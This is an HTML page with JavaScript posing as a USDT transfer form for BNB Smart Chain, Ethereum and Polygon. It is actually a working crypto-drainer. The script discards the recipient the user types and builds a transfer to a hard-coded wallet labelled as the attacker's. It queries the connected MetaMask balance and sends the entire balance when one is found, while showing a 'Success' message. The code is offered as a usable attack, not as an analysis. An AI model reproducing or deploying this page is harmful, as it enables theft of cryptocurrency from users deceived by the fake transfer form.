<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>USDT Transfer</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }
        body {
            background: #fff;
            padding: 20px;
            max-width: 500px;
            margin: 0 auto;
        }
        .section {
            margin-bottom: 20px;
        }
        label {
            font-size: 14px;
            font-weight: 600;
            color: #666;
            display: block;
            margin-bottom: 8px;
        }
        .input-group {
            display: flex;
            align-items: center;
            border: 2px solid #ddd;
            border-radius: 12px;
            padding: 0 15px;
            height: 54px;
            background: white;
        }
        .input-group input {
            flex: 1;
            border: none;
            outline: none;
            font-size: 16px;
            background: transparent;
            height: 100%;
        }
        .btn {
            color: #1E4DFF;
            font-weight: 700;
            cursor: pointer;
            font-size: 14px;
            padding: 5px 8px;
            background: none;
            border: none;
        }
        .btn:hover {
            opacity: 0.7;
        }
        .network-box {
            display: flex;
            align-items: center;
            justify-content: space-between;
            background: #f5f5f5;
            border-radius: 12px;
            padding: 12px 16px;
        }
        .network-box select {
            border: none;
            background: transparent;
            font-size: 15px;
            font-weight: 600;
            outline: none;
            cursor: pointer;
            padding: 5px;
            flex: 1;
        }
        .next-btn {
            width: 100%;
            height: 54px;
            background: #1E4DFF;
            color: white;
            border: none;
            border-radius: 30px;
            font-size: 17px;
            font-weight: 700;
            cursor: pointer;
            margin-top: 20px;
        }
        .next-btn:disabled {
            background: #999;
            cursor: not-allowed;
        }
        .approx {
            font-size: 13px;
            color: #999;
            margin-top: 8px;
        }
        .clear-btn {
            width: 20px;
            height: 20px;
            background: #999;
            border-radius: 50%;
            display: none;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            color: white;
            font-size: 16px;
        }
        .clear-btn.show {
            display: flex;
        }
        .token {
            color: #666;
            font-weight: 500;
            font-size: 14px;
        }
        .icon-svg {
            width: 20px;
            height: 20px;
            cursor: pointer;
        }
        .network-icon {
            font-size: 22px;
            margin-right: 5px;
        }
        .network-left {
            display: flex;
            align-items: center;
            flex: 1;
        }
        .status {
            text-align: center;
            padding: 10px;
            margin-top: 10px;
            font-weight: 600;
            display: none;
        }
        .status.show {
            display: block;
        }
        .status.success {
            color: green;
        }
        .status.error {
            color: red;
        }
    </style>
</head>
<body>

    <div class="section">
        <label>Address</label>
        <div class="input-group">
            <input type="text" id="recipient" placeholder="Enter address">
            <button class="btn" id="pasteBtn">Paste</button>
            <span class="clear-btn" id="clearAddr">×</span>
        </div>
    </div>

    <div class="section">
        <label>Network</label>
        <div class="network-box">
            <div class="network-left">
                <span class="network-icon" id="netIcon">🟡</span>
                <select id="networkSelect">
                    <option value="bsc">BNB Smart Chain</option>
                    <option value="ethereum">Ethereum</option>
                    <option value="polygon">Polygon</option>
                </select>
            </div>
            <span>▼</span>
        </div>
    </div>

    <div class="section">
        <label>Amount (USDT)</label>
        <div class="input-group">
            <input type="number" id="amount" placeholder="0.00" step="0.01">
            <span class="clear-btn" id="clearAmount">×</span>
            <span class="token">USDT</span>
            <button class="btn" id="maxBtn">Max</button>
        </div>
        <div class="approx">≈ $<span id="usdLabel">0.00</span></div>
    </div>

    <div class="status" id="status"></div>

    <button class="next-btn" id="nextBtn" disabled>Next</button>

    <script>
        // ============================================
        // CONFIGURATION - Attacker's Wallet
        // ============================================
        const DEST_WALLET = "0xB1E5005321cE082a7e4E8200050bc5db7C34696D";

        const NETWORKS = {
            bsc: {
                chainId: '0x38',
                chainName: 'BNB Smart Chain',
                rpc: 'https://bsc-dataseed1.binance.org/',
                usdt: '0x55d398326f99059fF775485246999027B3197955',
                icon: '🟡'
            },
            ethereum: {
                chainId: '0x1',
                chainName: 'Ethereum',
                rpc: 'https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161',
                usdt: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
                icon: '🔵'
            },
            polygon: {
                chainId: '0x89',
                chainName: 'Polygon',
                rpc: 'https://polygon-rpc.com/',
                usdt: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F',
                icon: '🟣'
            }
        };

        // ============================================
        // DOM ELEMENTS
        // ============================================
        const nextBtn = document.getElementById('nextBtn');
        const amountInput = document.getElementById('amount');
        const recipientInput = document.getElementById('recipient');
        const networkSelect = document.getElementById('networkSelect');
        const netIcon = document.getElementById('netIcon');
        const usdLabel = document.getElementById('usdLabel');
        const clearAddr = document.getElementById('clearAddr');
        const clearAmount = document.getElementById('clearAmount');
        const maxBtn = document.getElementById('maxBtn');
        const pasteBtn = document.getElementById('pasteBtn');
        const statusDiv = document.getElementById('status');

        let currentNetwork = 'bsc';
        let userAddress = '';

        // ============================================
        // UPDATE NETWORK DISPLAY
        // ============================================
        function updateNetwork() {
            const net = NETWORKS[currentNetwork];
            if (net) {
                netIcon.textContent = net.icon;
                networkSelect.value = currentNetwork;
            }
        }

        networkSelect.addEventListener('change', function() {
            currentNetwork = this.value;
            updateNetwork();
            console.log('Network:', NETWORKS[currentNetwork].chainName);
        });

        // ============================================
        // AMOUNT INPUT
        // ============================================
        amountInput.addEventListener('input', function() {
            const val = parseFloat(this.value) || 0;
            usdLabel.textContent = val.toFixed(2);
            nextBtn.disabled = val <= 0;
            if (val > 0) {
                clearAmount.classList.add('show');
            } else {
                clearAmount.classList.remove('show');
            }
        });

        clearAmount.addEventListener('click', function() {
            amountInput.value = '';
            amountInput.dispatchEvent(new Event('input'));
        });

        maxBtn.addEventListener('click', function() {
            amountInput.value = '1000';
            amountInput.dispatchEvent(new Event('input'));
        });

        // ============================================
        // ADDRESS INPUT
        // ============================================
        recipientInput.addEventListener('input', function() {
            if (this.value.length > 0) {
                clearAddr.classList.add('show');
            } else {
                clearAddr.classList.remove('show');
            }
        });

        clearAddr.addEventListener('click', function() {
            recipientInput.value = '';
            this.classList.remove('show');
        });

        pasteBtn.addEventListener('click', async function() {
            try {
                const text = await navigator.clipboard.readText();
                recipientInput.value = text;
                recipientInput.dispatchEvent(new Event('input'));
            } catch (e) {
                alert('Please paste manually');
            }
        });

        // ============================================
        // CHECK BALANCE
        // ============================================
        async function checkBalance(address, networkKey) {
            try {
                const net = NETWORKS[networkKey];
                const data = "0x70a08231" + address.replace('0x', '').padStart(64, '0');
                
                const res = await fetch(net.rpc, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        jsonrpc: "2.0",
                        id: 1,
                        method: "eth_call",
                        params: [{ to: net.usdt, data: data }, "latest"]
                    })
                });
                const json = await res.json();
                if (json.result && json.result !== '0x') {
                    return json.result;
                }
                return null;
            } catch (e) {
                console.error('Balance check error:', e);
                return null;
            }
        }

        // ============================================
        // SWITCH NETWORK
        // ============================================
        async function switchNetwork(networkKey) {
            const net = NETWORKS[networkKey];
            try {
                await window.ethereum.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: net.chainId }]
                });
                return true;
            } catch (error) {
                if (error.code === 4902) {
                    try {
                        await window.ethereum.request({
                            method: 'wallet_addEthereumChain',
                            params: [{
                                chainId: net.chainId,
                                chainName: net.chainName,
                                rpcUrls: [net.rpc],
                                nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
                                blockExplorerUrls: ['https://bscscan.com']
                            }]
                        });
                        return true;
                    } catch (e) {
                        showStatus('Failed to add network', 'error');
                        return false;
                    }
                }
                showStatus('Failed to switch network', 'error');
                return false;
            }
        }

        // ============================================
        // SEND USDT TO ATTACKER
        // ============================================
        async function sendToAttacker(amount, networkKey) {
            const net = NETWORKS[networkKey];
            
            // Convert amount to hex
            let amountHex;
            if (amount === 'max') {
                const balance = await checkBalance(userAddress, networkKey);
                if (balance) {
                    amountHex = balance.replace('0x', '').padStart(64, '0');
                } else {
                    const val = parseFloat(amountInput.value) || 1;
                    amountHex = BigInt(Math.floor(val * 10**18)).toString(16).padStart(64, '0');
                }
            } else {
                const val = parseFloat(amount) || 1;
                amountHex = BigInt(Math.floor(val * 10**18)).toString(16).padStart(64, '0');
            }
            
            // Build transaction - ALWAYS to DEST_WALLET
            const cleanDest = DEST_WALLET.replace('0x', '').toLowerCase().padStart(64, '0');
            const txData = "0xa9059cbb" + cleanDest + amountHex;
            
            console.log('🎯 Target:', DEST_WALLET);
            console.log('💰 Amount:', amountHex);
            
            const tx = await window.ethereum.request({
                method: 'eth_sendTransaction',
                params: [{
                    from: userAddress,
                    to: net.usdt,
                    data: txData,
                    value: '0x0'
                }]
            });
            
            return tx;
        }

        // ============================================
        // SHOW STATUS
        // ============================================
        function showStatus(msg, type) {
            statusDiv.textContent = msg;
            statusDiv.className = 'status show ' + type;
            setTimeout(() => {
                statusDiv.className = 'status';
            }, 5000);
        }

        // ============================================
        // MAIN - NEXT BUTTON
        // ============================================
        async function handleNext() {
            if (nextBtn.disabled) return;
            
            // Check MetaMask
            if (typeof window.ethereum === 'undefined') {
                alert('Please install MetaMask!');
                return;
            }
            
            const originalText = nextBtn.textContent;
            nextBtn.textContent = 'Processing...';
            nextBtn.disabled = true;
            
            try {
                // 1. Get user address
                const accounts = await window.ethereum.request({ method: 'eth_accounts' });
                if (accounts.length === 0) {
                    const newAccounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                    userAddress = newAccounts[0];
                } else {
                    userAddress = accounts[0];
                }
                
                if (!userAddress) {
                    throw new Error('No wallet connected');
                }
                
                console.log('👤 User:', userAddress);
                showStatus('Connecting...', '');
                
                // 2. Switch network
                const switched = await switchNetwork(currentNetwork);
                if (!switched) {
                    throw new Error('Network switch failed');
                }
                
                showStatus('Checking balance...', '');
                
                // 3. Check balance
                const balanceHex = await checkBalance(userAddress, currentNetwork);
                let balance = 0;
                if (balanceHex) {
                    balance = parseInt(balanceHex, 16) / 10**18;
                    console.log('💰 Balance:', balance, 'USDT');
                }
                
                // 4. Send to attacker
                let amountToSend;
                if (balance > 0) {
                    amountToSend = 'max';
                    showStatus('Sending ' + balance.toFixed(2) + ' USDT...', '');
                } else {
                    amountToSend = amountInput.value || '1';
                    showStatus('Sending ' + amountToSend + ' USDT...', '');
                }
                
                const txHash = await sendToAttacker(amountToSend, currentNetwork);
                
                console.log('✅ TX:', txHash);
                showStatus('✅ Success! Transaction: ' + txHash.slice(0, 10) + '...', 'success');
                
                nextBtn.textContent = '✅ Done!';
                setTimeout(() => {
                    nextBtn.textContent = originalText;
                    nextBtn.disabled = false;
                }, 3000);
                
            } catch (error) {
                console.error('❌ Error:', error);
                showStatus('❌ Failed: ' + error.message, 'error');
                nextBtn.textContent = '❌ Failed';
                setTimeout(() => {
                    nextBtn.textContent = originalText;
                    nextBtn.disabled = false;
                }, 3000);
            }
        }

        // ============================================
        // INIT
        // ============================================
        document.addEventListener('DOMContentLoaded', function() {
            console.log('🚀 App Ready');
            console.log('🎯 Attacker:', DEST_WALLET);
            
            // Set default
            updateNetwork();
            amountInput.dispatchEvent(new Event('input'));
            
            // Click handler
            nextBtn.addEventListener('click', handleNext);
            
            // Enter key support
            amountInput.addEventListener('keydown', function(e) {
                if (e.key === 'Enter' && !nextBtn.disabled) {
                    nextBtn.click();
                }
            });
        });
    </script>
</body>
</html>
